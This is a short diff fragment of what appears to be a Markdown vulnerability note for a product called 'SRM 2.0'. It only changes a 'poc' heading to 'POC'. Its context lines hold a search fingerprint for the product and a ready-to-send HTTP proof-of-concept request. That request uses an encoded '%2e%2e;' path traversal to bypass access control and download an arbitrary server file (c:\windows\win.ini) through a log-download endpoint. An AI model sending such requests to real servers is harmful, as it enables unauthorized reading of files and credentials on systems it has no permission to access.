@@ -8,7 +8,7 @@
 title=="SRM 2.0"
 ```
 
-## poc
+## POC
 
 ```java
 GET /adpweb/static/%2e%2e;/a/sys/runtimeLog/download?path=c:\\windows\win.ini HTTP/1.1
